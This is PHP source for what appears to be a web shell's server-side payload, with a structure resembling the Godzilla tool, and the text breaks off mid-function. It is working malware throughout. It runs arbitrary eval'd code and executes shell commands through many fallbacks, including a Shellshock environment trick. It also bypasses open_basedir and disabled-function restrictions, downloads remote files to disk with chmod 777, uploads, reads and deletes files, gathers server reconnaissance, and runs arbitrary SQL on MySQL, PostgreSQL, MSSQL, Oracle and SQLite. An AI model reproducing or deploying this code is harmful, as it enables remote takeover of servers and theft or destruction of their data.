$parameters=array();
$_SES=array();
function run($pms){
    global $ERRMSG;
    global $parameters;

    reDefSystemFunc();
    $_SES=&getSession();
    @session_start();
    $sessioId=md5(session_id());
    if (isset($_SESSION[$sessioId])){
        $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId)));
    }
    @session_write_close();

    if (canCallGzipDecode()==1&&@isGzipStream($pms)){
        $pms=gzdecode($pms);
    }
    $parameters = g_deserialize($pms);

    if (isset($_SES["bypass_open_basedir"])&&$_SES["bypass_open_basedir"]==true){
        @bypass_open_basedir();
    }

    if (function_existsEx("set_error_handler")){
        @set_error_handler("payloadErrorHandler");
    }
    if (function_existsEx("set_exception_handler")){
        @set_exception_handler("payloadExceptionHandler");
    }
    $ver = PHP_VERSION;
    $result = "";
    if (get("bypassRasp") == 1 || $ver[0]<5){
        $result=@evalFunc();
    }else{
        $exceptionType = "Exception";
        if ($ver[0] >=7){
            $exceptionType = "Throwable";
        }
        $result = eval('try{return @evalFunc();} catch ('.$exceptionType.' $e) {return "Uncaught exception: ".$e->getMessage();}');
    }

    if ($result==null||$result===false){
        $result=$ERRMSG;
    }

    if ($_SES!==null){
        @session_start();
        $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId));
        @session_write_close();
    }
    if (canCallGzipEncode()){
        $result=gzencode($result,6);
    }

    return $result;
}
function payloadExceptionHandler($exception){
    global $ERRMSG;
    $ERRMSG.="ExceptionMsg:".$exception->getMessage()."\r\n";
    return true;
}
function payloadErrorHandler($errno, $errstr, $errfile=null, $errline=null,$errcontext=null){
    global $ERRMSG;
    $ERRMSG.="ErrLine: {$errline} ErrorMsg:{$errstr}\r\n";
    return true;
}
function S1MiwYYr($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $D[$i] = $D[$i]^$K[($i+1)%15];
    }
    return $D;
}
function reDefSystemFunc(){
    if (!function_exists("file_get_contents")&&!is_callable("file_get_contents")) {
        function file_get_contents($file) {
            $f = @fopen($file,"rb");
            $contents = false;
            if ($f) {
                do { $contents .= fgets($f,1024*1024); } while (!feof($f));
            }
            fclose($f);
            return $contents;
        }
    }
    if (!function_exists('gzdecode')&&!is_callable("gzdecode")&&function_existsEx("gzinflate")) {
        function gzdecode($data)
        {
            return gzinflate(substr($data,10,-8));
        }
    }
    if (!function_exists("sys_get_temp_dir")&&!is_callable("sys_get_temp_dir")){
        function sys_get_temp_dir(){
            $SCRIPT_FILENAME=dirname(__FILE__);
            if (substr($SCRIPT_FILENAME, 0, 1) != '/'){
                return "C:/Windows/Temp/";
            }else{
                return "/tmp/";
            }
        }
    }
    if (!function_exists("getmygid") && !is_callable("getmygid")){
        function getmygid(){
            return 0;
        }
    }
    if (!function_existsEx("scandir")&&function_existsEx("opendir")&&function_existsEx("readdir")){
        function scandirEx($directory){
            $dh  = opendir($directory);
            if ($dh!==false){
                $files=array();
                while (false !== ($filename = readdir($dh))) {
                    $files[] = $filename;
                }
                @closedir($dh);
                return $files;
            }
            return false;
        }
    }
    if (!function_exists("file_put_contents")&&!is_callable("file_put_contents")){
        function file_put_contents($fileName, $data){
            $handle=fopen($fileName,"wb");
            if ($handle!==false){
                $len=fwrite($handle,$data);
                return $len;
                @fclose($handle);
            }else{
                return false;
            }
        }
    }
    if (!function_exists("is_executable")&&!is_callable("is_executable")){
        function is_executable($fileName){
            return false;
        }
    }

}
function &getSession(){
    global $_SES;
    return $_SES;
}
function bypass_open_basedir(){
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    $allFiles = @scandir($_FILENAME);
    $cdStatus=false;
    if ($allFiles!=null){
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                if (@is_dir($fileName)){
                    if (@chdir($fileName)===true){
                        $cdStatus=true;
                        break;
                    }
                }
            }

        }
    }
    if(!@file_exists('bypass_open_basedir')&&!$cdStatus){
        @mkdir('bypass_open_basedir');
    }
    if (!$cdStatus){
        @chdir('bypass_open_basedir');
    }
    @ini_set('open_basedir','..');
    @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']);
    @$_path = str_replace("\\",'/',$_FILENAME);
    @$_num = substr_count($_path,'/') + 1;
    $_i = 0;
    while($_i < $_num){
        @chdir('..');
        $_i++;
    }
    @ini_set('open_basedir','/');
    if (!$cdStatus){
        @rmdir($_FILENAME.'/'.'bypass_open_basedir');
    }
}
function g_deserialize($pms){
    $index=0;
    $key=null;
    $parameters = array();
    while (true){
        $q=$pms[$index];
        $f = ord($q);
        if ($f == 0x01){
            $len=bytesToInt(substr($pms,$index+1,4));
            $index+=4;
            $value=substr($pms,$index+1,$len);
            $index+=$len;
            $parameters[$key]=g_deserialize($value);
            $key=null;
        }
        else if ($f==0x02){
            $len=bytesToInt(substr($pms,$index+1,4));
            $index+=4;
            $value=substr($pms,$index+1,$len);
            $index+=$len;
            $parameters[$key]=$value;
            $key=null;
        }else{
            $key.=$q;
        }
        $index++;
        if ($index>strlen($pms)-1){
            break;
        }
    }
    return $parameters;
}

function g_serialize($par){
    $out = "";
    foreach ($par as $key => $value) {
        $out.=$key;
        $_v = null;
        if (is_array($value)){
            $out.="\x01";
            $_v = g_serialize($value);
        }else{
            $out.="\x02";
            $_v = "".$value;
        }
        $out.=intToBytes(strlen($_v));
        $out.=$_v;
    }
    return $out;
}


function evalFunc(){
    @session_write_close();
    $className=get("codeName");
    $methodName=get("methodName");
    $_SES=&getSession();
    if ($methodName!=null){
        if (strlen(trim($className))>0){
            if ($methodName=="includeCode"){
                return includeCode();
            }else{
                if (isset($_SES[$className])){
                    return eval($_SES[$className]);
                }else{
                    return "{$className} no load";
                }
            }
        }else{
            if (function_exists($methodName)){
                return $methodName();
            }else{
                return "function {$methodName} not exist";
            }
        }
    }else{
        return "methodName Is Null";
    }

}
function deleteDir($p){
    $m=@dir($p);
    while(@$f=$m->read()){
        $pf=$p."/".$f;
        @chmod($pf,0777);
        if((is_dir($pf))&&($f!=".")&&($f!="..")){
            deleteDir($pf);
            @rmdir($pf);
        }else if (is_file($pf)&&($f!=".")&&($f!="..")){
            @unlink($pf);
        }
    }
    $m->close();
    @chmod($p,0777);
    return @rmdir($p);
}
function deleteFile(){
    $F=get("fileName");
    if(is_dir($F)){
        return deleteDir($F)?"ok":"fail";
    }else{
        return (file_exists($F)?@unlink($F)?"ok":"fail":"fail");
    }
}
function setFileAttr(){
    $type = get("type");
    $attr = get("attr");
    $fileName = get("fileName");
    $ret = "Null";
    if ($type!=null&&$attr!=null&&$fileName!=null) {
        if ($type=="fileBasicAttr"){
            if (@chmod($fileName,convertFilePermissions($attr))){
                return "ok";
            }else{
                return "fail";
            }
        }else if ($type=="fileTimeAttr"){
            if (@touch($fileName,$attr)){
                return "ok";
            }else{
                return "fail";
            }
        }else{
            return "no ExcuteType";
        }
    }else{
        $ret="type or attr or fileName is null";
    }
    return $ret;
}
function fileRemoteDown(){
    $url=get("url");
    $saveFile=get("saveFile");
    if ($url!=null&&$saveFile!=null) {
        $data=@file_get_contents($url);
        if ($data!==false){
            if (@file_put_contents($saveFile,$data)!==false){
                @chmod($saveFile,0777);
                return "ok";
            }else{
                return "write fail";
            }
        }else{
            return "read fail";
        }
    }else{
        return "url or saveFile is null";
    }
}
function copyFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (@is_file($srcFileName)){
        if (copy($srcFileName,$destFileName)){
            return "ok";
        }else{
            return "fail";
        }
    }else{
        return "The target does not exist or is not a file";
    }
}
function moveFile(){
    $srcFileName=get("srcFileName");
    $destFileName=get("destFileName");
    if (rename($srcFileName,$destFileName)){
        return "ok";
    }else{
        return "fail";
    }

}
function getBasicsInfo()
{
    $data = array();
    $data['OsInfo'] = @php_uname();
    $data['CurrentUser'] = @get_current_user();
    $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) > 0 ? $data['CurrentUser'] : 'NULL';
    $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR'];
    $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT'];
    $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP'];
    $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR'];
    $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['disable_functions'] = @ini_get('disable_functions');
    $data['disable_functions'] = strlen(trim($data['disable_functions'])) > 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions');
    $data['Open_basedir'] = @ini_get('open_basedir');
    $data['timezone'] = @ini_get('date.timezone');
    $data['encode'] = @ini_get('exif.encode_unicode');
    $data['extension_dir'] = @ini_get('extension_dir');
    $data['Path'] = @getenv('Path');
    $data['PATHEXT'] = @getenv('PATHEXT');
    $data['APPDATA'] = @getenv('APPDATA');
    $tmpDir=@sys_get_temp_dir();
    $separator=substr($tmpDir,strlen($tmpDir)-1,1);
    if ($separator!='\\'&&$separator!='/'){
        $tmpDir=$tmpDir.'/';
    }
    $data['systempdir'] = $tmpDir;
    $data['include_path'] = @ini_get('include_path');
    $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT'];
    $data['PHP_SAPI'] = PHP_SAPI;
    $data['PHP_VERSION'] = PHP_VERSION;
    $data['PHP_INT_SIZE'] = PHP_INT_SIZE;
    $data['ProcessArch'] = PHP_INT_SIZE==8?"x64":"x86";
    $data['PHP_OS'] = PHP_OS;
    $data['canCallGzipDecode'] = canCallGzipDecode();
    $data['canCallGzipEncode'] = canCallGzipEncode();
    $data['session_name'] = @ini_get("session.name");
    $data['session_save_path'] = @ini_get("session.save_path");
    $data['session_save_handler'] = @ini_get("session.save_handler");
    $data['session_serialize_handler'] = @ini_get("session.serialize_handler");
    $data['user_ini_filename'] = @ini_get("user_ini.filename");
    $data['memory_limit'] = @ini_get('memory_limit');
    $data['upload_max_filesize'] = @ini_get('upload_max_filesize');
    $data['post_max_size'] = @ini_get('post_max_size');
    $data['max_execution_time'] = @ini_get('max_execution_time');
    $data['max_input_time'] = @ini_get('max_input_time');
    $data['default_socket_timeout'] = @ini_get('default_socket_timeout');
    $data['mygid'] = @getmygid();
    $data['mypid'] = @getmypid();
    $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE'];
    $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT'];
    $data['loaded_extensions'] = @implode(',', @get_loaded_extensions());
    $data['short_open_tag'] = @get_cfg_var('short_open_tag');
    $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false';
    $data['asp_tags'] = @get_cfg_var('asp_tags');
    $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false';
    $data['safe_mode'] = @get_cfg_var('safe_mode');
    $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false';
    $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME']));
    if (strlen(trim($data['CurrentDir']))==0){
        $data['CurrentDir'] = str_replace('\\', '/', @dirname(__FILE__));
    }
    $SCRIPT_FILENAME=@dirname(__FILE__);
    $data['FileRoot'] = '';
    if (substr($SCRIPT_FILENAME, 0, 1) != '/') {
        $drivers=array('C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');
        foreach ($drivers as $L){
            if (@is_dir("{$L}:/")){
                $data['FileRoot'] .= "{$L}:/;";}
        }
        if (empty($data['FileRoot'])){
            $data['FileRoot']=substr($SCRIPT_FILENAME,0,3);
        }
    }else{
        $data['FileRoot'] .= "/";
    }
    $result="";
    foreach($data as $key=>$value){
        $result.=$key." : ".$value."\n";
    }
    return $result;
}

function getFileEx($dir){
    $result = array();
    $filesystem = new DirectoryIterator($dir);
    $result["currentDir"] = $dir;
    $fileIndex = 0;
    foreach ($filesystem as $fileInfo) {
        if($fileInfo->isDot()){
            continue;
        }
        $lineData=array();
        $lineData[] = $fileInfo->getFilename();
        $lineData[] = $fileInfo->isFile()?"1":"0";
        $lineData[] = @date("Y-m-d H:i:s", $fileInfo->getMTime());
        $lineData[] = $fileInfo->getSize();
        $fr=($fileInfo->isReadable()?"R":"").($fileInfo->isWritable()?"W":"").($fileInfo->isExecutable()?"X":"");
        $lineData[] = $fr;
        $result[$fileIndex] = $lineData;
        $fileIndex++;
    }
    $result["count"] = $fileIndex;
    return g_serialize($result);
}

function getFile(){
    $dir=get('dirName');
    $dir=(strlen(@trim($dir))>0)?trim($dir):str_replace('\\','/',dirname(__FILE__));
    $dir.="/";
    $path=$dir;

    if (!@function_existsEx("scandir")&&!@function_existsEx("scandirEx")&&@class_exists("DirectoryIterator")){
        return getFileEx($path);
    }

    $allFiles = function_existsEx("scandirEx")?@scandirEx($path):@scandir($path);
    $result=array();
    $fileIndex = 0;
    if ($allFiles!=null){
        $result["currentDir"] = $path;
        foreach ($allFiles as $fileName) {
            if ($fileName!="."&&$fileName!=".."){
                $fullPath = $path.$fileName;
                $lineData=array();
                $lineData[] = $fileName;
                $lineData[] = @is_file($fullPath)?"1":"0";
                $lineData[] = date("Y-m-d H:i:s", @filemtime($fullPath));
                $lineData[] = @filesize($fullPath);
                $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":"");
                $lineData[] = $fr;
                $result[$fileIndex] = $lineData;
                $fileIndex++;
            }
        }
        $result["count"] = $fileIndex;
    }else{
        $result["errMsg"] = "Path does not exist or does not have permission to read!";
    }
    return g_serialize($result);
}
function readFileContent(){
    $fileName=get("fileName");
    if (@is_file($fileName)){
        if (function_existsEx("file_get_contents")){
            return file_get_contents($fileName);
        }else if (class_exists("SplFileObject")){
            $file = new SplFileObject($fileName,"rb");
            return $file->fread($file->getSize());
        }else{
            return "No Permission!";
        }
    }else{
        return "File Not Found";
    }
}
function uploadFile(){
    $fileName=get("fileName");
    $fileValue=get("fileValue");
    if (function_existsEx("file_put_contents")){
        if (@file_put_contents($fileName,$fileValue)!==false){
            @chmod($fileName,0777);
            return "ok";
        }
    }else if (class_exists("SplFileObject")){
        $file = new SplFileObject($fileName,"wb");
        $file->fwrite($fileValue);
        $file->fflush();
        $file = null;
        return "ok";
    }
    return "fail";
}
function newDir(){
    $dir=get("dirName");
    if (@mkdir($dir,0777,true)!==false){
        return "ok";
    }else{
        return "fail";
    }
}
function newFile(){
    $fileName=get("fileName");
    if (@file_put_contents($fileName,"")!==false){
        return "ok";
    }else{
        return "fail";
    }
}

function function_existsEx($functionName){
    $functionName=strtolower((string)$functionName);
    $d=explode(",",@ini_get("disable_functions"));
    if(empty($d)){
        $d=array();
    }else{
        $d=array_map('trim',array_map('strtolower',$d));
    }
    $suhosin=@ini_get("suhosin.executor.func.blacklist");
    if(!empty($suhosin)){
        $d=array_merge($d,array_map('trim',array_map('strtolower',explode(",",$suhosin))));
    }
    return(function_exists($functionName)&&is_callable($functionName)&&!in_array($functionName,$d,true));
}

function execCommand(){
    @ob_start();
    $cmdLine=get("cmdLine");
    if(function_existsEx("putenv")){
        $oldPath=function_existsEx("getenv")?((string)@getenv("PATH")):"";
        if(substr(__FILE__,0,1)=="/"){
            @putenv("PATH=".$oldPath.":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
        }else{
            @putenv("PATH=".$oldPath.";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
        }
    }
    $needPath="";
    if(substr(__FILE__,0,1)=="/"&&!function_existsEx("putenv")){
        // putenv disabled: rebuild PATH via shell builtin export so children can find commands
        $needPath="export PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\";";
    }
    $result="";
    if (!function_existsEx("runshellshock")){
        function runshellshock($d, $c) {
            if (substr($d, 0, 1) == "/" && function_existsEx('putenv') && (function_existsEx('error_log') || function_existsEx('mail'))) {
                if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                    $tmp = tempnam(sys_get_temp_dir(), 'as');
                    @putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                    if (function_existsEx('error_log')) {
                        error_log("a", 1);
                    } else {
                        mail("a@127.0.0.1", "", "", "-bv");
                    }
                } else {
                    return False;
                }
                $output = @file_get_contents($tmp);
                @unlink($tmp);
                if ($output != "") {
                    return $output;
                }
            }
            return False;
        };
    }

    if(function_existsEx('system')){
        @system($needPath.$cmdLine,$ret);
    }elseif(function_existsEx('passthru')){
        $result=@passthru($needPath.$cmdLine,$ret);
    }elseif(function_existsEx('shell_exec')){
        $result=@shell_exec($needPath.$cmdLine);
    }elseif(function_existsEx('exec')){
        @exec($needPath.$cmdLine,$o,$ret);
        $result=join("\n",$o);
    }elseif(function_existsEx('popen')){
        $fp=@popen($needPath.$cmdLine,'r');
        while(!@feof($fp)){
            $result.=@fgets($fp,1024*1024);
        }
        @pclose($fp);
    }elseif(function_existsEx('proc_open')){
        $p = @proc_open($needPath.$cmdLine, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while(!@feof($io[1])){
            $result.=@fgets($io[1],1024*1024);
        }
        while(!@feof($io[2])){
            $result.=@fgets($io[2],1024*1024);
        }
        @fclose($io[1]);
        @fclose($io[2]);
        @proc_close($p);
    }elseif(substr(__FILE__,0,1)!="/" && @class_exists("COM")){
        $w=new COM('WScript.shell');
        $e=$w->exec($cmdLine);
        $so=$e->StdOut();
        $result.=$so->ReadAll();
        $se=$e->StdErr();
        $result.=$se->ReadAll();
    }elseif (function_existsEx("pcntl_fork")&&function_existsEx("pcntl_exec")){
        $cmd="/bin/bash";
        if (!file_exists($cmd)){
            $cmd="/bin/sh";
        }
        $commandFile=sys_get_temp_dir()."/".time().".log";
        $resultFile=sys_get_temp_dir()."/".(time()+1).".log";
        @file_put_contents($commandFile,$cmdLine);
        switch (pcntl_fork()) {
            case 0:
                $args = array("-c", "$cmdLine > $resultFile");
                pcntl_exec($cmd, $args);
                // the child will only reach this point on exec failure,
                // because execution shifts to the pcntl_exec()ed command
                exit(0);
            default:
                break;
        }
        if (!file_exists($resultFile)){
            sleep(2);
        }
        $result=file_get_contents($resultFile);
        @unlink($commandFile);
        @unlink($resultFile);

    }elseif(($result=execByFpm($cmdLine))!==false) {

    }elseif(($result=runshellshock(__FILE__, $cmdLine)!==false)) {

    }else{
        return "Command execution function is disabled Tried proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec/FPM";
    }
    $result .= @ob_get_contents();
    @ob_end_clean();

    return $result;
}
function execSql(){
    $dbType=get("dbType");
    $dbDrive=get("dbDrive");
    $connectString=get("connectString");
    $host=get("dbHost");
    $port=get("dbPort");
    $username=get("dbUsername");
    $password=get("dbPassword");
    $execType=get("execType");
    $sql=get("execSql");
    $charset=get("dbCharset");
    $currentDb=get("currentDb");
    function  mysqli_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb){
        $conn = new mysqli($host,$username,$password,"",$port);
        $result = array();
        if ($conn->connect_error) {
            $result["errMsg"] = $conn->connect_error;
            return g_serialize($result);
        }
        if (!empty($charset)){
            $conn->set_charset($charset);
        }
        if (!empty($currentDb)){
            $conn->select_db($currentDb);
        }
        $sqlresult = $conn->query($sql);
        if ($conn->error){
            $result["errMsg"] = $conn->error;
            return g_serialize($result);
        }
        if ($execType=="update"){
            $result["errMsg"] = "Query OK, ".$conn->affected_rows." rows affected";
            return g_serialize($result);
        }else{
            $columns = array();
            while ($column = $sqlresult->fetch_field()){
                $columns[] = $column->name;
            }
            $result["column"] = &$columns;
            $rows = array();
            if ($sqlresult->num_rows > 0) {
                while($row = $sqlresult->fetch_assoc()) {
                    $onerow = array();
                    foreach ($row as $value){
                        $onerow[] = $value;
                    }
                    $rows[] = $onerow;
                }
            }
            $columns["count"] = count($columns);
            $rows["count"] = count($rows);
            $result["rows"] = &$rows;
        }
        return g_serialize($result);
    }
    function mysql_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb) {
        $con = @mysql_connect($host.":".$port, $username, $password);
        $result[] = array();
        if (!$con) {
            $result["errMsg"] = mysql_error();
            return g_serialize($result);
        } else {
            if (!empty($charset)){
                mysql_set_charset($charset,$con);
            }
            if (!empty($currentDb)){
                if (function_existsEx("mysql_selectdb")){
                    mysql_selectdb($currentDb,$con);
                }elseif (function_existsEx("mysql_select_db")){
                    mysql_select_db($currentDb,$con);
                }
            }
            $sqlresult = @mysql_query($sql);
            if (!$sqlresult) {
                $result["errMsg"] = mysql_error();
                return g_serialize($result);
            }
            if ($execType == "update") {
                $result["errMsg"] = "Query OK, ".mysql_affected_rows($con)." rows affected";
                return g_serialize($result);
            } else {
                $columns = array();
                for ($i = 0; $i < mysql_num_fields($sqlresult); $i++) {
                    $columns[] = mysql_field_name($sqlresult, $i);
                }
                $columns["count"] = count($columns);
                $result["column"] = &$columns;
                $rowNum = mysql_num_rows($sqlresult);
                $rows = array();
                if ($rowNum > 0) {
                    while ($row = mysql_fetch_row($sqlresult)) {
                        $onerow=array();
                        foreach($row as $value) {
                            $onerow[] = $value;
                        }
                        $rows[] =$onerow;
                    }
                }
                $rows["count"] = count($rows);
                $result["rows"] = &$rows;
            }
            @mysql_close($con);
        }
        return g_serialize($result);
    }
    function mysqliEx_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb){
        $port == "" ? $port = "3306" : $port;
        $result = array();
        $T=@mysqli_connect($host,$username,$password,"",$port);
        if (!$T){
            $result["errMsg"] = mysqli_connect_error();
            return g_serialize($result);
        }

        if (!empty($charset)){
            @mysqli_set_charset($charset);
        }
        if (!empty($currentDb)){
            @mysqli_select_db($T,$currentDb);
        }
        $q=@mysqli_query($T,$sql);
        if(is_bool($q)){
            $result["errMsg"] = mysqli_error($T);
            return g_serialize($result);
        }else{
            if (mysqli_num_fields($q)>0){
                $columns = array();
                while($col=@mysqli_fetch_field($q)){
                    $columns[] = $col->name;
                }
                $result["column"] = &$columns;
                $rows = array();
                while($rs=@mysqli_fetch_row($q)){
                    $row = array();
                    for($c=0;$c<count($columns);$c++){
                        $row[] = $rs[$c];
                    }
                    $rows[] = $row;
                }
                $columns["count"] = count($columns);
                $rows["count"] = count($rows);
                $result["rows"] = &$rows;
            }else{
                $result["errMsg"] = "Query OK, ".@mysqli_affected_rows($T)." rows affected";
            }
        }
        return g_serialize($result);
    }
    function pg_execEx($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb){
        $port == "" ? $port = "5432" : $port;
        $result = array();
        $arr=array(
            'host'=>$host,
            'port'=>$port,
            'user'=>$username,
            'password'=>$password
        );
        if (!empty($currentDb)){
            $arr["dbname"]=$currentDb;
        }
        $cs='';
        foreach($arr as $k=>$v) {
            if(empty($v)){
                continue;
            }
            $cs .= "$k=$v ";
        }
        $T=@pg_connect($cs);
        if(!$T){
            $result["errMsg"] = "Database connection failure!";
            return g_serialize($result);
        }else{
            if (!empty($charset)){
                @pg_set_client_encoding($T,$charset);
            }
            $q=@pg_query($T, $sql);
            if(!$q){
                $result["errMsg"] = @pg_last_error($T);
                return g_serialize($result);
            }else{
                $n=@pg_num_fields($q);
                if($n===0){
                    $result["errMsg"] = "Query OK, ".@pg_affected_rows($q)." rows affected";
                    return g_serialize($result);
                }else{
                    $columns = array();
                    for($i=0;$i<$n;$i++){
                        $columns[] = @pg_field_name($q,$i);
                    }
                    $result["column"] = &$columns;
                    $rows = array();
                    while($row=@pg_fetch_row($q)){
                        $onerow = array();
                        for($i=0;$i<$n;$i++){
                            $onerow[] = $row[$i]!==NULL?$row[$i]:"NULL";
                        }
                        $rows[] = $onerow;
                    }
                    $columns["count"] = count($columns);
                    $rows["count"] = count($rows);
                    $result["rows"] = &$rows;
                }
            }
        }
        return g_serialize($result);
    }
    function sqlsrv_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb){
        $result = array();
        @sqlsrv_configure('WarningsReturnAsErrors',0);
        $dbConfig=array("UID"=> $username,"PWD"=>$password);
        if (!empty($currentDb)){
            $dbConfig["Database"]=$currentDb;
        }
        if (!empty($charset)){
            $dbConfig["CharacterSet"]=$charset;
        }
        $host .=", ".$port;

        $T=@sqlsrv_connect($host,$dbConfig);

        if (!$T){
            $err="";
            if(($e = sqlsrv_errors()) != null){
                foreach($e as $v){
                    $err.=($v['message'])."\n";
                }
            }
            $result["errMsg"] = $err;
            return g_serialize($result);
        }
        $q=@sqlsrv_query($T,$sql,null);
        if($q!==false){
            $i=0;
            $fm=@sqlsrv_field_metadata($q);
            if(empty($fm)){
                $ar=@sqlsrv_rows_affected($q);
                $result["errMsg"] =  "Query OK, ".$ar." rows affected";
                return g_serialize($result);
            }else{
                $columns = array();
                foreach($fm as $rs){
                    $columns[] = $rs['Name'];
                    $i++;
                }
                $result["column"] = &$columns;
                $rows = array();
                while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){
                    $row = array();
                    for($c=0;$c<$i;$c++){
                        $row[] = $rs[$c];
                    }
                    $rows[] = $row;
                }
                $columns["count"] = count($columns);
                $rows["count"] = count($rows);
                $result["rows"] = &$rows;
            }
        }else{
            $err="";
            if(($e = sqlsrv_errors()) != null){
                foreach($e as $v){
                    $err.=($v['message'])."\n";
                }
            }
            $result["errMsg"] = $err;
        }
        return g_serialize($result);
    }
    function mssql_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb){
        $T=@mssql_connect($host,$username,$password);
        $result = array();
        if (!$T){
            $result["errMsg"] = mssql_get_last_message();
            return g_serialize($result);
        }

        if (!empty($currentDb)){
            @mssql_select_db($currentDb);
        }
        $q=@mssql_query($sql,$T);
        if(is_bool($q)){
            if ($q){
                $result["errMsg"] = "Query OK, ".@mssql_rows_affected($T)." rows affected";
                return g_serialize($result);
            }else{
                $result["errMsg"] = mssql_get_last_message();
                return g_serialize($result);
            }
        }else{
            $columns = array();
            while($rs=@mssql_fetch_field($q)){
                $columns[] = $rs->name;
            }
            $result["column"] = &$columns;
            $rows[] = array();
            while($rs=@mssql_fetch_row($q)){
                $row = array();
                for($c=0;$c<count($columns);$c++){
                    $row[] = $rs[$c];
                }
                $rows[] = $row;
            }
            @mssql_free_result($q);
            @mssql_close($T);
            $columns["count"] = count($columns);
            $rows["count"] = count($rows);
            $result["rows"] = &$rows;
        }
        return g_serialize($result);
    }
    function oci_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb) {
        $chs = $charset ? $charset : "utf8";
        $result = array();
        $mod = 0;
        if ($username=="sys"){
            $mod = 2;
        }
        $H = @oci_connect($username, $password, $connectString, $chs, $mod);
        if (!$H) {
            $errObj=@oci_error();
            $result["errMsg"] =  $errObj["message"];
            return g_serialize($result);
        } else {
            $q = @oci_parse($H, $sql);
            if (@oci_execute($q)) {
                $n = oci_num_fields($q);
                if ($n == 0) {
                    $result["errMsg"] = "Query OK, ".@oci_num_rows($q)." rows affected";
                    return g_serialize($result);
                } else {
                    $column = array();
                    for ($i = 1; $i <= $n; $i++) {
                        $column[] = oci_field_name($q, $i);
                    }
                    $result["column"] = &$column;
                    $rows = array();
                    while ($row = @oci_fetch_array($q, OCI_ASSOC + OCI_RETURN_NULLS)) {
                        $onerow = array();
                        foreach($row as $item) {
                            $onerow[] = $item;
                        }
                        $rows[]=$onerow;
                    }
                    $column["count"] = count($column);
                    $rows["count"] = count($rows);
                    $result["rows"]=&$rows;
                    return g_serialize($result);
                }
            } else {
                $e = @oci_error($H);
                if ($e) {
                    $result["errMsg"] = "errMsg: {$e['message']}";
                } else {
                    $result["errMsg"] = "An error occurred while executing a SQL statement";
                }
            }
        }
        return g_serialize($result);
    }
    function ora_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb) {
        $result = array();
        $H = @ora_plogon("{$username}@{$host}", "{$password}");
        if (!$H) {
            $result["errMsg"] = "Database connection failure!";
            return g_serialize($result);
        } else {
            $T = @ora_open($H);
            @ora_commitoff($H);
            $q = @ora_parse($T, "{$sql}");
            $R = ora_exec($T);
            if ($R) {
                $n = ora_numcols($T);
                if (!$n){
                    $result["errMsg"] = "ok";
                    return g_serialize($result);
                }
                $column = array();
                for ($i = 0; $i < $n; $i++) {
                    $column[] = Ora_ColumnName($T, $i);
                }
                $result["column"] = &$column;
                $rows = array();
                while (ora_fetch($T)) {
                    $row = array();
                    for ($i = 0; $i < $n; $i++) {
                        $row[] = ora_getcolumn($T, $i);
                    }
                    $rows[] = $row;
                }
                $column["count"] = count($column);
                $rows["count"] = count($rows);
                $result["rows"] = &$rows;
            } else {
                $result["errMsg"] = "An error occurred during the query";
            }
        }
        return g_serialize($result);
    }
    function sqlite_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb) {
        $dbh=new SQLite3($host);
        $result = array();
        if(!$dbh){
            $result["errMsg"] = SQLite3::lastErrorMsg();
            return g_serialize($result);
        }else{
            $stmt=$dbh->prepare($sql);
            if(!$stmt){
                $result["errMsg"] = $dbh->lastErrorMsg();
                return g_serialize($result);
            } else {
                $sqlresult=$stmt->execute();
                if(!$sqlresult){
                    $result["errMsg"] = $dbh->lastErrorMsg();
                    return g_serialize($result);
                }else{
                    $bool=True;
                    $column = array();
                    $rows = array();
                    while($res=$sqlresult->fetchArray(SQLITE3_ASSOC)){
                        $row = array();
                        if($bool){
                            foreach($res as $key=>$value){
                                $column[] = $key;
                            }
                            $bool=False;
                        }
                        foreach($res as $key=>$value){
                            $row[] = value!==NULL?$value:"NULL";
                        }
                        $rows[]=$row;
                    }
